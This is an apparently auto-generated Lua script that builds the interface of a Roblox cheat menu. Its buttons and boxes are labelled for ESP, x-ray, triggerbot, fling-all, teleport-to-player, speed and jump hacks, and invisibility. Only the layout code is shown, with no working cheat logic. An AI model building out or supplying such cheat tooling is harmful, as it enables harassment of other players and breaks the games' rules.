-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local MAIN = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Frame = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Container = Instance.new("Frame")
local Frame_3 = Instance.new("Frame")
local ProfilePicture = Instance.new("ImageLabel")
local UICorner_3 = Instance.new("UICorner")
local UICorner_4 = Instance.new("UICorner")
local InfoContainer = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local ServerPlayersLabel = Instance.new("TextLabel")
local ServerUptimeLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local Frame_4 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local TextLabel_4 = Instance.new("TextLabel")
local Frame_5 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local tpknocked = Instance.new("TextBox")
local UICorner_7 = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local Fling = Instance.new("TextBox")
local UICorner_8 = Instance.new("UICorner")
local UIGradient_2 = Instance.new("UIGradient")
local highlightplayer = Instance.new("TextBox")
local UICorner_9 = Instance.new("UICorner")
local UIGradient_3 = Instance.new("UIGradient")
local quickbuttons = Instance.new("Frame")
local UICorner_10 = Instance.new("UICorner")
local Frame_6 = Instance.new("Frame")
local UICorner_11 = Instance.new("UICorner")
local Frame_7 = Instance.new("Frame")
local SPEED = Instance.new("TextBox")
local UICorner_12 = Instance.new("UICorner")
local xray = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local UIGradient_4 = Instance.new("UIGradient")
local UIGradient_5 = Instance.new("UIGradient")
local triggerbot = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local UIGradient_6 = Instance.new("UIGradient")
local serverhop = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local UIGradient_7 = Instance.new("UIGradient")
local ESP = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local UIGradient_8 = Instance.new("UIGradient")
local invis = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local UIGradient_9 = Instance.new("UIGradient")
local lock = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local UIGradient_10 = Instance.new("UIGradient")
local infiniteyield = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local UIGradient_11 = Instance.new("UIGradient")
local flingall = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local UIGradient_12 = Instance.new("UIGradient")
local splitsectp = Instance.new("TextButton")
local UICorner_21 = Instance.new("UICorner")
local UIGradient_13 = Instance.new("UIGradient")
local UIListLayout_2 = Instance.new("UIListLayout")
local jumppower = Instance.new("TextBox")
local UICorner_22 = Instance.new("UICorner")
local UIGradient_14 = Instance.new("UIGradient")
local Teleport = Instance.new("TextBox")
local UICorner_23 = Instance.new("UICorner")
local UIGradient_15 = Instance.new("UIGradient")
local TextLabel_6 = Instance.new("TextLabel")
local NameLabel = Instance.new("TextLabel")
local TextLabel_7 = Instance.new("TextLabel")
local TextLabel_8 = Instance.new("TextLabel")
local Container2 = Instance.new("Frame")
local quickbuttons_2 = Instance.new("Frame")
local UICorner_24 = Instance.new("UICorner")
local Frame_8 = Instance.new("Frame")
local UICorner_25 = Instance.new("UICorner")
local Frame_9 = Instance.new("Frame")
local UIListLayout_3 = Instance.new("UIListLayout")
local zombieanim = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local UIGradient_16 = Instance.new("UIGradient")
local bubblyanim = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local UIGradient_17 = Instance.new("UIGradient")
local cartoonanim = Instance.new("TextButton")
local UICorner_28 = Instance.new("UICorner")
local UIGradient_18 = Instance.new("UIGradient")
local TextLabel_9 = Instance.new("TextLabel")
local Container4 = Instance.new("Frame")
local quickbuttons_3 = Instance.new("Frame")
local UICorner_29 = Instance.new("UICorner")
local Frame_10 = Instance.new("Frame")
local UICorner_30 = Instance.new("UICorner")
local Frame_11 = Instance.new("Frame")
local UIListLayout_4 = Instance.new("UIListLayout")
local TextLabel_10 = Instance.new("TextLabel")
local Container5 = Instance.new("Frame")
local Container3 = Instance.new("Frame")
local UICorner_31 = Instance.new("UICorner")
local quickbuttons_4 = Instance.new("Frame")
local UICorner_32 = Instance.new("UICorner")
local Frame_12 = Instance.new("Frame")
local UICorner_33 = Instance.new("UICorner")
local Frame_13 = Instance.new("Frame")
local UIListLayout_5 = Instance.new("UIListLayout")
local summonfriends = Instance.new("TextButton")
local UICorner_34 = Instance.new("UICorner")
local UIGradient_19 = Instance.new("UIGradient")
local jork = Instance.new("TextButton")
local UICorner_35 = Instance.new("UICorner")
local UIGradient_20 = Instance.new("UIGradient")
local blackhole = Instance.new("TextButton")
local UIGradient_21 = Instance.new("UIGradient")
local UICorner_36 = Instance.new("UICorner")
local TextLabel_11 = Instance.new("TextLabel")
local ImageButton = Instance.new("ImageButton")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local ImageButton_2 = Instance.new("ImageButton")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
local sidebar = Instance.new("Frame")
local UICorner_37 = Instance.new("UICorner")
local Frame_14 = Instance.new("Frame")
local Frame_15 = Instance.new("Frame")
local UIListLayout_6 = Instance.new("UIListLayout")
local UICorner_38 = Instance.new("UICorner")
local xSetting = Instance.new("ImageButton")
local Spectate = Instance.new("ImageButton")
local Hammer = Instance.new("ImageButton")
local Emotes = Instance.new("ImageButton")
local AHome = Instance.new("ImageButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MAIN.Name = "MAIN"
MAIN.Parent = ScreenGui
MAIN.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
MAIN.BorderColor3 = Color3.fromRGB(27, 42, 53)
MAIN.Position = UDim2.new(0, 269, 0, 259)
MAIN.Size = UDim2.new(0, 598, 0, 348)

UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = MAIN

Frame.Parent = MAIN
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame.Position = UDim2.new(0, 2, 0, 2)
Frame.Size = UDim2.new(0, 596, 0, 346)

UICorner_2.CornerRadius = UDim.new(0, 4)
UICorner_2.Parent = Frame

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Frame_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(-5.61156776e-06, 0, 0.0920204669, 0)
Frame_2.Size = UDim2.new(0, 596, 0, 1)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel.Position = UDim2.new(0.0130000003, 0, 0.00300000003, 1)
TextLabel.Size = UDim2.new(0, 97, 0, 28)
TextLabel.Font = Enum.Font.GothamMedium
TextLabel.Text = "/esp"
TextLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel.TextSize = 15.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

Container.Name = "Container"
Container.Parent = Frame
Container.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Container.BackgroundTransparency = 1.000
Container.BorderColor3 = Color3.fromRGB(27, 42, 53)
Container.Position = UDim2.new(0.0117449667, 0, 0.14161849, 0)
Container.Size = UDim2.new(0, 582, 0, 283)

Frame_3.Parent = Container
Frame_3.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Frame_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_3.Position = UDim2.new(0.0171821304, 0, 0, 0)
Frame_3.Size = UDim2.new(0, 69, 0, 67)

ProfilePicture.Name = "ProfilePicture"
ProfilePicture.Parent = Frame_3
ProfilePicture.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ProfilePicture.BorderColor3 = Color3.fromRGB(27, 42, 53)
ProfilePicture.Position = UDim2.new(0, 1, 0, 1)
ProfilePicture.Size = UDim2.new(0, 67, 0, 66)
ProfilePicture.Image = "rbxassetid://9581016780"

UICorner_3.CornerRadius = UDim.new(0, 4)
UICorner_3.Parent = ProfilePicture

UICorner_4.CornerRadius = UDim.new(0, 4)
UICorner_4.Parent = Frame_3

InfoContainer.Name = "InfoContainer"
InfoContainer.Parent = Frame_3
InfoContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfoContainer.BackgroundTransparency = 1.000
InfoContainer.BorderColor3 = Color3.fromRGB(27, 42, 53)
InfoContainer.Position = UDim2.new(0.0144927539, 0, 1.08955228, 0)
InfoContainer.Size = UDim2.new(0, 117, 0, 202)

UIListLayout.Parent = InfoContainer
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 8)

ServerPlayersLabel.Name = "ServerPlayersLabel"
ServerPlayersLabel.Parent = InfoContainer
ServerPlayersLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ServerPlayersLabel.BackgroundTransparency = 1.000
ServerPlayersLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
ServerPlayersLabel.Position = UDim2.new(0.0181546025, 0, 0.257059485, 1)
ServerPlayersLabel.Size = UDim2.new(0, 186, 0, 13)
ServerPlayersLabel.Font = Enum.Font.Gotham
ServerPlayersLabel.Text = "Player count: 100"
ServerPlayersLabel.TextColor3 = Color3.fromRGB(206, 206, 206)
ServerPlayersLabel.TextScaled = true
ServerPlayersLabel.TextSize = 15.000
ServerPlayersLabel.TextWrapped = true
ServerPlayersLabel.TextXAlignment = Enum.TextXAlignment.Left

ServerUptimeLabel.Name = "ServerUptimeLabel"
ServerUptimeLabel.Parent = InfoContainer
ServerUptimeLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ServerUptimeLabel.BackgroundTransparency = 1.000
ServerUptimeLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
ServerUptimeLabel.Position = UDim2.new(0.0181546025, 0, 0.257059485, 1)
ServerUptimeLabel.Size = UDim2.new(0, 186, 0, 13)
ServerUptimeLabel.Font = Enum.Font.Gotham
ServerUptimeLabel.Text = "Server uptime: 1h - 52m - 42s"
ServerUptimeLabel.TextColor3 = Color3.fromRGB(206, 206, 206)
ServerUptimeLabel.TextScaled = true
ServerUptimeLabel.TextSize = 15.000
ServerUptimeLabel.TextWrapped = true
ServerUptimeLabel.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_2.Name = ""
TextLabel_2.Parent = InfoContainer
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_2.Position = UDim2.new(0.0181546025, 0, 0.257059485, 1)
TextLabel_2.Size = UDim2.new(0, 186, 0, 13)
TextLabel_2.Font = Enum.Font.Gotham
TextLabel_2.Text = "VERSION 01."
TextLabel_2.TextColor3 = Color3.fromRGB(206, 206, 206)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 15.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_3.Parent = Frame_3
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_3.Position = UDim2.new(1.09515917, 0, 0.71974659, 1)
TextLabel_3.Size = UDim2.new(0, 47, 0, 9)
TextLabel_3.Font = Enum.Font.Gotham
TextLabel_3.Text = "ezrunsyou"
TextLabel_3.TextColor3 = Color3.fromRGB(206, 206, 206)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 15.000
TextLabel_3.TextWrapped = true
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

Frame_4.Parent = Container
Frame_4.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Frame_4.BackgroundTransparency = 0.150
Frame_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_4.Position = UDim2.new(0.495079011, -2, -0.000891156436, 0)
Frame_4.Size = UDim2.new(0, 227, 0, 155)

UICorner_5.CornerRadius = UDim.new(0, 4)
UICorner_5.Parent = Frame_4

TextLabel_4.Parent = Frame_4
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_4.Position = UDim2.new(0.0140000004, 3, 0.0439999998, 3)
TextLabel_4.Size = UDim2.new(0, 160, 0, 13)
TextLabel_4.Font = Enum.Font.GothamMedium
TextLabel_4.Text = "Stuff"
TextLabel_4.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 15.000
TextLabel_4.TextWrapped = true
TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left

Frame_5.Parent = Container
Frame_5.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_5.Position = UDim2.new(0.496797234, -2, 0.00264241244, 0)
Frame_5.Size = UDim2.new(0, 225, 0, 153)

UICorner_6.CornerRadius = UDim.new(0, 4)
UICorner_6.Parent = Frame_5

TextLabel_5.Parent = Frame_5
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_5.Position = UDim2.new(0.00955566391, 3, 0.0505359136, 3)
TextLabel_5.Size = UDim2.new(0, 160, 0, 13)
TextLabel_5.Font = Enum.Font.GothamMedium
TextLabel_5.Text = "More Buttons"
TextLabel_5.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 15.000
TextLabel_5.TextWrapped = true
TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left

tpknocked.Name = "tpknocked"
tpknocked.Parent = Frame_5
tpknocked.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
tpknocked.BorderColor3 = Color3.fromRGB(27, 42, 53)
tpknocked.Position = UDim2.new(0.065915525, 0, 0.410234243, 0)
tpknocked.Size = UDim2.new(0, 195, 0, 20)
tpknocked.Font = Enum.Font.Gotham
tpknocked.PlaceholderText = "TP ON KNOCKED (DH GAMES)"
tpknocked.Text = ""
tpknocked.TextColor3 = Color3.fromRGB(0, 0, 0)
tpknocked.TextSize = 13.000

UICorner_7.CornerRadius = UDim.new(0, 3)
UICorner_7.Parent = tpknocked

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient.Rotation = 90
UIGradient.Parent = tpknocked

Fling.Name = "Fling"
Fling.Parent = Frame_5
Fling.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Fling.BorderColor3 = Color3.fromRGB(27, 42, 53)
Fling.Position = UDim2.new(0.065915525, 0, 0.191796392, 0)
Fling.Size = UDim2.new(0, 195, 0, 20)
Fling.Font = Enum.Font.Gotham
Fling.PlaceholderText = "FLING USERNAME HERE"
Fling.Text = ""
Fling.TextColor3 = Color3.fromRGB(0, 0, 0)
Fling.TextSize = 13.000

UICorner_8.CornerRadius = UDim.new(0, 3)
UICorner_8.Parent = Fling

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_2.Rotation = 90
UIGradient_2.Parent = Fling

highlightplayer.Name = "highlightplayer"
highlightplayer.Parent = Frame_5
highlightplayer.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
highlightplayer.BorderColor3 = Color3.fromRGB(27, 42, 53)
highlightplayer.Position = UDim2.new(0.065915525, 0, 0.610960722, 0)
highlightplayer.Size = UDim2.new(0, 195, 0, 20)
highlightplayer.Font = Enum.Font.Gotham
highlightplayer.PlaceholderText = "HIGHLIGHT PLAYER"
highlightplayer.Text = ""
highlightplayer.TextColor3 = Color3.fromRGB(0, 0, 0)
highlightplayer.TextSize = 13.000

UICorner_9.CornerRadius = UDim.new(0, 3)
UICorner_9.Parent = highlightplayer

UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_3.Rotation = 90
UIGradient_3.Parent = highlightplayer

quickbuttons.Name = "quick buttons"
quickbuttons.Parent = Container
quickbuttons.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
quickbuttons.BorderColor3 = Color3.fromRGB(27, 42, 53)
quickbuttons.Position = UDim2.new(0.0201855432, -2, 0.576438129, 0)
quickbuttons.Size = UDim2.new(0, 512, 0, 126)

UICorner_10.CornerRadius = UDim.new(0, 4)
UICorner_10.Parent = quickbuttons

Frame_6.Parent = quickbuttons
Frame_6.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_6.Position = UDim2.new(0, 1, 0, 1)
Frame_6.Size = UDim2.new(0, 510, 0, 124)

UICorner_11.CornerRadius = UDim.new(0, 4)
UICorner_11.Parent = Frame_6

Frame_7.Parent = Frame_6
Frame_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_7.BackgroundTransparency = 1.000
Frame_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_7.Position = UDim2.new(0.0137254903, 0, 0.225806206, 0)
Frame_7.Size = UDim2.new(0, 497, 0, 87)

SPEED.Name = "SPEED"
SPEED.Parent = Frame_7
SPEED.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
SPEED.BorderColor3 = Color3.fromRGB(27, 42, 53)
SPEED.Position = UDim2.new(-0.0140845068, 0, 1.12643683, 0)
SPEED.Size = UDim2.new(0, 195, 0, 23)
SPEED.Font = Enum.Font.Gotham
SPEED.PlaceholderText = "SPEED"
SPEED.Text = ""
SPEED.TextColor3 = Color3.fromRGB(0, 0, 0)
SPEED.TextSize = 13.000

UICorner_12.CornerRadius = UDim.new(0, 3)
UICorner_12.Parent = SPEED

xray.Name = "xray"
xray.Parent = SPEED
xray.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
xray.BorderColor3 = Color3.fromRGB(27, 42, 53)
xray.Position = UDim2.new(1.05641055, 0, -0.304347813, 0)
xray.Size = UDim2.new(0, 91, 0, 23)
xray.AutoButtonColor = false
xray.Font = Enum.Font.Gotham
xray.Text = "XRAY"
xray.TextColor3 = Color3.fromRGB(209, 209, 209)
xray.TextSize = 14.000

UICorner_13.CornerRadius = UDim.new(0, 3)
UICorner_13.Parent = xray

UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_4.Rotation = 90
UIGradient_4.Parent = xray

UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_5.Rotation = 90
UIGradient_5.Parent = SPEED

triggerbot.Name = "triggerbot"
triggerbot.Parent = SPEED
triggerbot.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
triggerbot.BorderColor3 = Color3.fromRGB(27, 42, 53)
triggerbot.Position = UDim2.new(1.55897462, 0, -0.304347813, 0)
triggerbot.Size = UDim2.new(0, 91, 0, 23)
triggerbot.AutoButtonColor = false
triggerbot.Font = Enum.Font.Gotham
triggerbot.Text = "TRIGGERBOT"
triggerbot.TextColor3 = Color3.fromRGB(209, 209, 209)
triggerbot.TextSize = 14.000

UICorner_14.CornerRadius = UDim.new(0, 3)
UICorner_14.Parent = triggerbot

UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_6.Rotation = 90
UIGradient_6.Parent = triggerbot

serverhop.Name = "serverhop"
serverhop.Parent = SPEED
serverhop.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
serverhop.BorderColor3 = Color3.fromRGB(27, 42, 53)
serverhop.Position = UDim2.new(1.55900002, 0, 2.60899997, 0)
serverhop.Size = UDim2.new(0, 91, 0, 23)
serverhop.AutoButtonColor = false
serverhop.Font = Enum.Font.Gotham
serverhop.Text = "SERVERHOP"
serverhop.TextColor3 = Color3.fromRGB(209, 209, 209)
serverhop.TextSize = 14.000

UICorner_15.CornerRadius = UDim.new(0, 3)
UICorner_15.Parent = serverhop

UIGradient_7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_7.Rotation = 90
UIGradient_7.Parent = serverhop

ESP.Name = "ESP"
ESP.Parent = SPEED
ESP.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
ESP.BorderColor3 = Color3.fromRGB(27, 42, 53)
ESP.Position = UDim2.new(1.55897462, 0, 1.173913, 0)
ESP.Size = UDim2.new(0, 91, 0, 23)
ESP.AutoButtonColor = false
ESP.Font = Enum.Font.Gotham
ESP.Text = "ESP"
ESP.TextColor3 = Color3.fromRGB(209, 209, 209)
ESP.TextSize = 14.000

UICorner_16.CornerRadius = UDim.new(0, 3)
UICorner_16.Parent = ESP

UIGradient_8.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_8.Rotation = 90
UIGradient_8.Parent = ESP

invis.Name = "invis"
invis.Parent = SPEED
invis.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
invis.BorderColor3 = Color3.fromRGB(27, 42, 53)
invis.Position = UDim2.new(1.05641055, 0, 1.173913, 0)
invis.Size = UDim2.new(0, 91, 0, 23)
invis.AutoButtonColor = false
invis.Font = Enum.Font.Gotham
invis.Text = "INVIS KINDA"
invis.TextColor3 = Color3.fromRGB(209, 209, 209)
invis.TextSize = 14.000

UICorner_17.CornerRadius = UDim.new(0, 3)
UICorner_17.Parent = invis

UIGradient_9.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_9.Rotation = 90
UIGradient_9.Parent = invis

lock.Name = "lock"
lock.Parent = SPEED
lock.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
lock.BorderColor3 = Color3.fromRGB(27, 42, 53)
lock.Position = UDim2.new(1.05641055, 0, 2.60869575, 0)
lock.Size = UDim2.new(0, 91, 0, 23)
lock.AutoButtonColor = false
lock.Font = Enum.Font.Gotham
lock.Text = "LOCK"
lock.TextColor3 = Color3.fromRGB(209, 209, 209)
lock.TextSize = 14.000

UICorner_18.CornerRadius = UDim.new(0, 3)
UICorner_18.Parent = lock

UIGradient_10.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_10.Rotation = 90
UIGradient_10.Parent = lock

infiniteyield.Name = "infinite yield"
infiniteyield.Parent = SPEED
infiniteyield.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
infiniteyield.BorderColor3 = Color3.fromRGB(27, 42, 53)
infiniteyield.Position = UDim2.new(2.07692337, 0, -0.304347813, 0)
infiniteyield.Size = UDim2.new(0, 91, 0, 23)
infiniteyield.AutoButtonColor = false
infiniteyield.Font = Enum.Font.Gotham
infiniteyield.Text = "INF YIELD"
infiniteyield.TextColor3 = Color3.fromRGB(209, 209, 209)
infiniteyield.TextSize = 14.000

UICorner_19.CornerRadius = UDim.new(0, 3)
UICorner_19.Parent = infiniteyield

UIGradient_11.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_11.Rotation = 90
UIGradient_11.Parent = infiniteyield

flingall.Name = "fling all"
flingall.Parent = SPEED
flingall.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
flingall.BorderColor3 = Color3.fromRGB(27, 42, 53)
flingall.Position = UDim2.new(2.07692337, 0, 1.173913, 0)
flingall.Size = UDim2.new(0, 91, 0, 23)
flingall.AutoButtonColor = false
flingall.Font = Enum.Font.Gotham
flingall.Text = "FLING ALL"
flingall.TextColor3 = Color3.fromRGB(209, 209, 209)
flingall.TextSize = 14.000

UICorner_20.CornerRadius = UDim.new(0, 3)
UICorner_20.Parent = flingall

UIGradient_12.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_12.Rotation = 90
UIGradient_12.Parent = flingall

splitsectp.Name = "split sec tp"
splitsectp.Parent = SPEED
splitsectp.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
splitsectp.BorderColor3 = Color3.fromRGB(27, 42, 53)
splitsectp.Position = UDim2.new(2.07692337, 0, 2.60869575, 0)
splitsectp.Size = UDim2.new(0, 91, 0, 23)
splitsectp.AutoButtonColor = false
splitsectp.Font = Enum.Font.Gotham
splitsectp.Text = "SPLITSECTP"
splitsectp.TextColor3 = Color3.fromRGB(209, 209, 209)
splitsectp.TextSize = 14.000

UICorner_21.CornerRadius = UDim.new(0, 3)
UICorner_21.Parent = splitsectp

UIGradient_13.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_13.Rotation = 90
UIGradient_13.Parent = splitsectp

UIListLayout_2.Parent = Frame_7
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_2.Padding = UDim.new(0, 10)

jumppower.Name = "jump power"
jumppower.Parent = Frame_7
jumppower.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
jumppower.BorderColor3 = Color3.fromRGB(27, 42, 53)
jumppower.Position = UDim2.new(-0.0140845068, 0, 1.12643683, 0)
jumppower.Size = UDim2.new(0, 195, 0, 23)
jumppower.Font = Enum.Font.Gotham
jumppower.PlaceholderText = "JUMP POWER"
jumppower.Text = ""
jumppower.TextColor3 = Color3.fromRGB(0, 0, 0)
jumppower.TextSize = 13.000

UICorner_22.CornerRadius = UDim.new(0, 3)
UICorner_22.Parent = jumppower

UIGradient_14.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_14.Rotation = 90
UIGradient_14.Parent = jumppower

Teleport.Name = "Teleport"
Teleport.Parent = Frame_7
Teleport.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Teleport.BorderColor3 = Color3.fromRGB(27, 42, 53)
Teleport.Position = UDim2.new(-0.0140845068, 0, 1.12643683, 0)
Teleport.Size = UDim2.new(0, 195, 0, 23)
Teleport.Font = Enum.Font.Gotham
Teleport.PlaceholderText = "TELEPORT USERNAME HERE"
Teleport.Text = ""
Teleport.TextColor3 = Color3.fromRGB(0, 0, 0)
Teleport.TextSize = 13.000

UICorner_23.CornerRadius = UDim.new(0, 3)
UICorner_23.Parent = Teleport

UIGradient_15.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_15.Rotation = 90
UIGradient_15.Parent = Teleport

TextLabel_6.Parent = Frame_6
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_6.Position = UDim2.new(0.0140000004, 3, 0.0439999998, 3)
TextLabel_6.Size = UDim2.new(0, 160, 0, 13)
TextLabel_6.Font = Enum.Font.GothamMedium
TextLabel_6.Text = "Quick Buttons"
TextLabel_6.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 15.000
TextLabel_6.TextWrapped = true
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left

NameLabel.Name = "NameLabel"
NameLabel.Parent = Container
NameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NameLabel.BackgroundTransparency = 1.000
NameLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
NameLabel.Position = UDim2.new(0.147020578, 0, -0.00442461763, 1)
NameLabel.Size = UDim2.new(0, 160, 0, 25)
NameLabel.Font = Enum.Font.GothamMedium
NameLabel.Text = "LOADIN"
NameLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
NameLabel.TextSize = 15.000
NameLabel.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_7.Parent = Container
